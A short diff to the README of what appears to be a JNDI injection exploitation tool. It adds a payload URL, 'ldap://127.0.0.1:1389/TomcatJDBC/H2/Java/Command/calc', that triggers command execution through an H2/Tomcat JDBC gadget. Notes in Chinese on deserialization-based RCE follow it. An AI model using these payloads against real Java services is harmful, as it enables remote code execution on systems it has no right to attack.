@@ -166,6 +166,10 @@ ldap://127.0.0.1:1389/JSVGCanvas/Command/calc
 - Derby
 - Teradata
 
+```
+ldap://127.0.0.1:1389/TomcatJDBC/H2/Java/Command/calc
+```
+
 ### 反序列化
 
 通过反序列化来进行RCE，暂不支持rmi协议
